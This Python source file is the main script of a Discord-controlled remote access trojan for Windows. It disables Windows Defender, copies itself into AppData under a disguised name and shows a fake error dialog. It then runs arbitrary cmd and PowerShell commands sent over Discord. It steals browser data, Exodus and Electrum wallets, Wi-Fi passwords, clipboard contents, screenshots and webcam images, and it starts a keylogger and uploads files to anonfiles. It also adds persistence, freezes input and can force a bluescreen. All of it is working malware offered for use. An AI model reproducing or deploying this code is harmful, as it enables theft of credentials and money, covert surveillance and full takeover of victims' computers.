import os, discord, subprocess, requests, ctypes, zipfile, threading, keyboard
from pynput.mouse import Controller
from PIL import ImageGrab, Image
import cv2
from tkinter import messagebox
import sys
from config import TOKEN, GUILD_ID, DEFENDER, ERROR, MOVE#, ANTIDEBUG
from modules.browser import run, delete_files
from modules.keylogger import Keylogger
#from modules.antidebug import Antidebug
from modules.info import start
from modules.wifi import WifiPasswords
from pyperclip import paste
from modules.startup import Startup



#if ANTIDEBUG:
#    Antidebug()

def disable_defender():
    #C:\> Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend && Set-MpPreference -SubmitSamplesConsent 2
    cmd = "powershell Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend && powershell Set-MpPreference -SubmitSamplesConsent 2"
    try:
        subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
    except:
        pass
    
if DEFENDER:
    disable_defender()


def copyfile(file, target):
    with open(file, "rb") as f:
        bins = f.read()
        
    with open(target, "wb") as f:
        f.write(bins)


file_dir = sys.argv[0]

def move():
    try:
        target_dir = f"{os.getenv('appdata')}\MicrosoftWindows\System"
        
        if not os.path.exists(target_dir):
            os.mkdir(f"{os.getenv('appdata')}\MicrosoftWindows")
            os.mkdir(target_dir)
        
        #shutil.copyfile(file_dir, f"{target_dir}\SystemBin_64bit.exe")

        copyfile(file_dir, f"{target_dir}\SystemBin_64bit.exe")

        try:
            os.chdir(target_dir)
            subprocess.Popen(f"{target_dir}\SystemBin_64bit.exe", shell=True, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP)
            sys.exit(0)
        except:
            pass
    except:
        return
    
if MOVE and file_dir[:1].upper() + file_dir[1:] != f"{os.getenv('appdata')}\MicrosoftWindows\System\SystemBin_64bit.exe":
    move()


def error():
    messagebox.showerror("Fatal Error", "Error code: 0x80070002\nAn internal error occurred while importing modules.")
    
if ERROR:
    error()


login = os.getlogin()
client = discord.Client(intents=discord.Intents.all())
session_id = os.urandom(8).hex()
freezed = False
#original_dir = os.getcwd()

    
commands = "\n".join([
    "help - Help command",
    "ping - Ping command",
    "sys - System information",
    "clipboard - Return clipboard content",
    "processes - Get all running processes",
    "cd - Change directory",
    "ls - List directory",
    "cwd - Get current working directory",
    "download <file> - Download file",
    "upload <link> - Upload file",
    "cmd <command> - Execute cmd command",
    "pw <command> - Execute powershell command",
    "run <file> - Run an file",
    "wifi - Return wifi passwords",
    "screenshot - Take a screenshot",
    "webcam - Get image of webcam",
    "bluescreen - Blue screen victim",
    "startup - Add to startup",
    "browser - Get browser data",
    "wallet - Get wallet information",
    "keylogger - Enable keylogger -- WIP -- !cant be stoped, only thru reboot or shutdown!",
    "freeze <1/0> - Freeze all inputs from keyboard and mouse",
    "!quit - Exit session without deleting all the data",
    "!exit - Exit session and delete all data"
])


async def wallets(channel):
    USER_DIR = os.path.expanduser("~")

    EXODUS_DIR = os.path.join(USER_DIR, "AppData", "Roaming", "Exodus", "exodus.wallet")
    ELECTRUM_DIR = os.path.join(USER_DIR, "AppData", "Roaming", "Electrum", "wallets")

    if os.path.exists(EXODUS_DIR):
        exodus_zip = zipfile.ZipFile("Exodus.zip", "w", zipfile.ZIP_DEFLATED)
        for root, dirs, files in os.walk(EXODUS_DIR):
            for file in files:
                exodus_zip.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), EXODUS_DIR))
        exodus_zip.close()

        try:
            with open("Exodus.zip", "rb") as wallet:
                wallet_zip = discord.File(wallet, filename=os.path.basename(file))
                await channel.send(file=wallet_zip)
        except:
            embed = discord.Embed(title="Error", description=f"No wallets were found!", color=0xfafafa)
            embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
            await channel.send(embed=embed)

        delete_files(["Exodus.zip"])
    
    else:
        embed = discord.Embed(title="Error", description=f"No wallets were found!", color=0xfafafa)
        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
        await channel.send(embed=embed)

    if os.path.exists(ELECTRUM_DIR):
        electrum_zip = zipfile.ZipFile("Electrum.zip", "w", zipfile.ZIP_DEFLATED)
        for root, dirs, files in os.walk(ELECTRUM_DIR):
            for file in files:
                electrum_zip.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), ELECTRUM_DIR))
        electrum_zip.close()

        try:
            with open("Electrum.zip", "rb") as wallet:
                wallet_zip = discord.File(wallet, filename=os.path.basename(file))
                await channel.send(file=wallet_zip)
        except:
            embed = discord.Embed(title="Error", description=f"No wallets were found!", color=0xfafafa)
            embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
            await channel.send(embed=embed)

        delete_files(["Electrum.zip"])
        
    else:
        embed = discord.Embed(title="Error", description=f"No wallets were found!", color=0xfafafa)
        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
        await channel.send(embed=embed)
        

async def browsers(channel):
    run()
    zip_files = []

    dir = os.getcwd()
    for filename in os.listdir(dir):
        if filename.endswith(".zip"):
            filepath = os.path.join(dir, filename)
            with zipfile.ZipFile(filepath, "r") as zip_file:
                if len(zip_file.namelist()) != 0:
                    zip_files.append(filepath)

    for file in zip_files:
        try:
            browser_data = discord.File(file, filename=os.path.basename(file))
            await channel.send(file=browser_data)
        except:
            embed = discord.Embed(title="Error", description=f"Browser data was not found!", color=0xfafafa)
            embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
            await channel.send(embed=embed)

    delete_files(["Chrome.zip", "Opera.zip", "OperaGX.zip", "Brave.zip", "Edge.zip", "Chromium.zip"])


def freeze():
    global blocking
    blocking = True
    block = threading.Thread(target=block_input)
    block.start()
            
def block_input():
    global blocking
    mouse = Controller()
    for i in range(150):
        try: keyboard.block_key(i)
        except: pass

    while blocking:
        mouse.position = (0, 0)

def unblock_input():
    global blocking
    blocking = False
    
    for i in range(150):
        try: keyboard.unblock_key(i)
        except: pass


@client.event
async def on_ready():
    #global channel
    
    guild = client.get_guild(int(GUILD_ID))
    channel = await guild.create_text_channel(session_id)
    embed = discord.Embed(title="New session created", description="", color=0xfafafa)
    embed.add_field(name="Session ID", value=f"```{session_id}```", inline=True)
    
    start()
    with open("system.txt", "r") as f:
        system_info = f.read()
    if system_info == "":
        system_info = "Failed to fetch system information!"
    
    embed.add_field(name="System Info", value=f"```{system_info}```", inline=False)
    embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
    await channel.send(embed=embed)
    delete_files(["system.txt"])
    #browsers(channel)

@client.event
async def on_message(message):    
    if message.author == client.user: #if message.author == client.user or message.channel.name != session_id:
        return

    if message.channel.name != session_id:
        return

    if message.webhook_id is not None:
        return
    
    if message.content == "help":
        embed = discord.Embed(title="Help", description=f"```{commands}```", color=0xfafafa)
        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
        await message.reply(embed=embed)

    elif message.content == "ping":
        msg = f"PONG, `{round(client.latency * 1000)}ms`"
        await message.reply(content=msg)

    elif message.content == "sys":
        await message.reply("Fetching data...", delete_after=.3)
        start()
        with open("system.txt", "r") as f:
            system_info = f.read()

        if system_info == "":
            system_info = "Failed to fetch system information!"

        embed = discord.Embed(title="System Information", description=f"```{system_info}```", color=0xfafafa)
        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
        await message.channel.send(embed=embed)
        delete_files(["system.txt"])
    
    elif message.content == "clipboard":
        try:
            clipboard = paste()
        except:
            clipboard = "Unknown"
        if clipboard == "":
            clipboard = "null"
        elif len(clipboard) > 1500:
            with open("clipboard.txt", "w", encoding="utf-8") as f:
                f.write(clipboard)
            clipboard_file = discord.File("clipboard.txt")
            await message.reply(file=clipboard_file)
            delete_files(["clipboard.txt"])
            return
        
        embed = discord.Embed(title="Clipboard Content", description=f"```{clipboard}```", color=0xfafafa)
        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
        await message.reply(embed=embed)
            
    elif message.content == "processes":
        try: 
            tasks = os.popen("tasklist").read()
        except:
            await message.reply("Failed to fetch task list!") 
            return


        if len(tasks) > 1500:
            with open("tasklist.txt", "w", encoding="utf-8") as f:
                f.write(tasks)
            await message.reply(file=discord.File("tasklist.txt"))
            delete_files(["tasklist.txt"])
        else:
            embed = discord.Embed(title="Processes", description=f"```{tasks}```", color=0xfafafa)
            embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
            await message.reply(embed=embed)
    
    
    elif message.content.startswith("cd"):
        directory = message.content[3:] #.split(" ")[1]
        try:
            os.chdir(directory)
            embed = discord.Embed(title="Changed Directory", description=f"```{os.getcwd()}```", color=0xfafafa)
        except:
            embed = discord.Embed(title="Error", description=f"```Directory Not Found```", color=0xfafafa)
        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
        await message.reply(embed=embed)

    elif message.content == "ls":
        files = "\n".join(os.listdir())
        if files == "":
            files = "No Files Found"
            
        elif len(files) > 1500:
            with open("files.txt", "w", encoding="utf-8") as f:
                f.write(files)
            file = discord.File("files.txt")
            embed = discord.Embed(title=f"Files > {os.getcwd()}", description="", color=0xfafafa)
            embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
            await message.reply(file=file, embed=embed)
            delete_files(["files.txt"])
            return
        
        embed = discord.Embed(title=f"Files > {os.getcwd()}", description=f"```{files}```", color=0xfafafa)
        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
        await message.reply(embed=embed)
        
    elif message.content == "cwd":
        embed = discord.Embed(title="CWD", description=f"```{os.getcwd()}```", color=0xfafafa) #{os.path.basename(link)}
        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
        await message.reply(embed=embed)

    elif message.content.startswith("download"):
        file = message.content[9:] #.split(" ")[1]
        try:
            link = requests.post("https://api.anonfiles.com/upload", files={"file": open(file, "rb")}).json()["data"]["file"]["url"]["full"]
            embed = discord.Embed(title="Download", description=f"```{link}```", color=0xfafafa)
            #await message.reply(embed=embed)
        except:
            embed = discord.Embed(title="Error", description=f"```File Not Found```", color=0xfafafa)
        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
        await message.reply(embed=embed)

    elif message.content.startswith("upload"):
        link = message.content[7:] #.split(" ")[1]
        try:
            file = requests.get(link).content
            with open(os.path.basename(link), "wb") as f:
                f.write(file)
        except:
            await message.reply("Failed to upload the file!")
            return
        embed = discord.Embed(title="Upload", description=f"```{os.getcwd()}\{os.path.basename(link)}```", color=0xfafafa)
        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
        await message.reply(embed=embed)

    elif message.content.startswith("cmd"):
        command = message.content[4:]
        try:
            output = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True).communicate()#[0].decode("utf-8")
            error_output = output[1].decode("utf-8")
            normal_output = output[0].decode("utf-8")
        except:
            await message.reply("Failed to execute pw command!")
            return
        
        embed = discord.Embed(title=f"{os.getcwd()}", description="", color=0xfafafa)
        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
        
        if len(normal_output) > 1500:
            with open("output.txt", "w", encoding="utf-8") as f:
                f.write(normal_output)
            
            file = discord.File("output.txt")
            await message.reply(file=file, embed=embed)
            delete_files(["output.txt"])
            return
        elif normal_output != "":
            embed.add_field(name="Output", value=f"```{normal_output}```", inline=False)
            
             
        if len(error_output) > 1500:
            with open("error.txt", "w", encoding="utf-8") as f:
                f.write(error_output)
            
            file = discord.File("error.txt")
            await message.reply(file=file, embed=embed)
            delete_files(["error.txt"])
            return      
        elif error_output != "":
            embed.add_field(name="Error", value=f"```{error_output}```", inline=False)
            
            
        if error_output == "" and normal_output == "":
            embed.add_field(name="Output", value="```No Output!```", inline=False)
            
        await message.reply(embed=embed)
        
        
    elif message.content.startswith("pw"):
        command = message.content[3:]
        try:
            output = subprocess.Popen(["powershell", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True).communicate()#[0].decode("utf-8")
            error_output = output[1].decode("utf-8")
            normal_output = output[0].decode("utf-8")
        except:
            await message.reply("Failed to execute pw command!")
            return
        
        embed = discord.Embed(title=f"{os.getcwd()}", description="", color=0xfafafa) # description=f"```{output}```",
        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
        
        if len(normal_output) > 1500:
            with open("output.txt", "w", encoding="utf-8") as f:
                f.write(normal_output)
            
            file = discord.File("output.txt")
            await message.reply(file=file, embed=embed)
            delete_files(["output.txt"])
            return
        elif normal_output != "":
            embed.add_field(name="Output", value=f"```{normal_output}```", inline=False)


        if len(error_output) > 1500:
            with open("error.txt", "w", encoding="utf-8") as f:
                f.write(error_output)
            
            file = discord.File("error.txt")
            await message.reply(file=file, embed=embed)
            delete_files(["error.txt"])
            return
        elif error_output != "":
            embed.add_field(name="Error", value=f"```{error_output}```", inline=False)
            
            
        if error_output == "" and normal_output == "":
            embed.add_field(name="Output", value="```No Output!```", inline=False)
            
        await message.reply(embed=embed)

    elif message.content.startswith("run"):
        file = message.content[4:]
        if file == "":
            message.reply("Please specify a file to run!")
        try:
            output = subprocess.Popen(file, shell=True, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP)
            embed = discord.Embed(title="Started", description=f"```{file}\n{output}```", color=0xfafafa)
        except:
            embed = discord.Embed(title="Error", description=f"```Failed to start: {file}```", color=0xfafafa)
            #await message.reply(embed=embed)
            #return
        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
        await message.reply(embed=embed)
    
    elif message.content == "startup":
        Startup(sys.argv[0])
        await message.reply("Startup Enabled!")
        
        
    elif message.content == "bluescreen":
        await message.reply("Attempting...", delete_after=.1)
        try:
            ntdll = ctypes.windll.ntdll
            prev_value = ctypes.c_bool()
            res = ctypes.c_ulong()
            ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
        except:
            await message.reply("Bluescreen Failed!")
            return
        
        if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
            await message.reply("Bluescreen Successful!")
        else:
            await message.reply("Bluescreen Failed!")


    elif message.content == "wifi":
        WifiPasswords().run()
        with open("wifi.txt", "r") as f:
            wifi = f.read()
        if wifi == "":
            wifi = "No wifi passwords found!"
        elif len(wifi) > 1500:
            file = discord.File("wifi.txt")
            await message.reply(file=file)
            delete_files(["wifi.txt"])
            return
        
        embed = discord.Embed(title="Wifi Passwords", description=f"```{wifi}```", color=0xfafafa)
        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
        await message.reply(embed=embed)
        delete_files(["wifi.txt"])

    
    elif message.content == "screenshot":
        try:
            screenshot = ImageGrab.grab(all_screens=True)
            path = os.path.join(os.getenv("TEMP"), "screenshot.png")
            screenshot.save(path)
        except:
            await message.reply("Failed to take screenshot!")
            return
        file = discord.File(path)
        embed = discord.Embed(title="Screenshot", color=0xfafafa)
        embed.set_image(url="attachment://screenshot.png")
        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
        await message.reply(embed=embed, file=file)

    elif message.content == "webcam":
        try:
            cap = cv2.VideoCapture(0)
            x, frame = cap.read()

            img = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            image = Image.fromarray(img)

            path = os.path.join(os.getenv("TEMP"), "webcam.png")
            image.save(path)
            cap.release()
        except:
            await message.reply("No webcams found!")
            return
        webcam = discord.File(path)
        embed = discord.Embed(title="Webcam", color=0xfafafa)
        embed.set_image(url="attachment://webcam.png")
        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
        await message.reply(embed=embed, file=webcam)
    
    elif message.content == "browser":
        await browsers(message.channel)

    elif message.content == "wallet":
        await wallets(message.channel)
    

    elif message.content == "keylogger":
        await message.reply("Creating new webhook for keylogger...")
        try:
            webhook = await message.channel.create_webhook(name="Keylogger")
            await message.reply(f"Created webhook, using URL: {webhook.url}")
            keylogger = threading.Thread(target=Keylogger(webhook.url).run)
            keylogger.start()
            
            #Keylogger(webhook.url).run()
        except:
            await message.reply(f"Failed to create new webhook!")
            return
        
        await message.reply("Keylogger enabled!")
    
    
    elif message.content.startswith("freeze "):
        action = message.content[7:]
        
        if action == "1":
            if freezed:
                await message.reply("Inputs are already freezed!")
            else:
                freeze()
                freezed = True
                await message.reply("Inputs are now freezed!")
        
        elif action == "0":
            if not freezed:
                await message.reply("Inputs are not freezed!")
            else:
                unblock_input()
                freezed = False
                await message.reply("Inputs are unfrezzed!")
        
        
    elif message.content == "!quit":
        await client.close()
       
    elif message.content == "!exit":
        await message.channel.delete()
        await client.close()
       
    else:
        embed = discord.Embed(title="Error", description="```Unknown command, use 'help' for full list of commands!```", color=0xfafafa)
        embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
        await message.reply(embed=embed)
    
try:
    client.run(TOKEN)
except:
    pass


#subprocess.run(["shutdown", "/s", "/t", "0"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

#subprocess.run(["shutdown", "/r", "/t", "0"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
